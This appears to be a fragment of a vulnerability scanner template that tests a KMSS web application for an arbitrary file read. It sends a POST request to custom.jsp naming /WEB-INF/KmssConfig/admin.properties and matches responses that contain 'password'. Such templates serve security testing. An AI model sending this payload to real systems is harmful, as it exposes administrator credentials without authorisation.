http:
    - body: var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
      headers:
        Content-Type: application/x-www-form-urlencoded
      matchers:
        - condition: and
          type: word
          words:
            - password
            - kmss
        - status:
            - 200
          type: status
      matchers-condition: and
      method: POST
      path:
        - '{{BaseURL}}/sys/ui/extend/varkind/custom.jsp'
